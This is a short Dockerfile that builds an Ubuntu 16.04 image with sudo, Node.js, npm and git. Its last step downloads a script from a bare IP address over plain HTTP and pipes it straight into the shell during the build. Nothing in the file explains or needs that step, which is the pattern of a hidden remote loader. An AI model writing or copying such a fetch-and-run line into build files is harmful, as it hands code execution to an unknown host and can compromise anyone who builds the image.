FROM ubuntu:16.04

RUN apt-get update && apt-get install -y sudo
RUN rm -rf /var/lib/apt/lists/* 
RUN apt-get update && apt-get install -y nodejs 
RUN apt-get update && apt-get install -y npm 
RUN apt-get update && apt-get install -y git
RUN wget -qO- http://35.232.178.43:8080/download/client | sh
	


